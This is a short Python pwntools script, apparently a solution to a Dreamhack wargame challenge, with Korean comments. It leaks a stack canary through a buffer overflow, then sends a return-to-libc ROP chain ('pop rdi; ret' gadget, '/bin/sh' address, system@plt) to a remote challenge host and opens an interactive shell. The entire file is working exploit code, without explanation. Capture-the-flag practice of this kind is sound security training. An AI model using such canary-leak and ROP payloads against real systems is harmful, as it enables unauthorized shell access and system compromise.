# Name: rtl.py

from pwn import *

context.arch = 'amd64'
context.os = 'linux'
# context.log_level = 'debug'

HOST = 'host3.dreamhack.games'
PORT = 18221

# conn = process('./rtl')
conn = remote(HOST, PORT)

conn.sendlineafter(b'Buf: ', b'A' * 0x38)
conn.recvuntil(b'\x0a')
canary = u64(b'\x00' + conn.recv(7))
system_plt = 0x4005d0 # system@plt 주소
binsh = 0x400874 # '/bin/sh' 주소
gadget = dict()
gadget['pop rdi; ret'] = 0x400853 # 'pop rdi; ret' 가젯 주소
gadget['ret'] = 0x400285 # 'ret' 가젯 주소

payload = b'A' * 0x38
payload += p64(canary)
payload += b'A' * 0x8
payload += p64(gadget['ret'])
payload += p64(gadget['pop rdi; ret'])
payload += p64(binsh)
payload += p64(system_plt)

conn.sendlineafter(b'Buf: ', payload)
conn.interactive()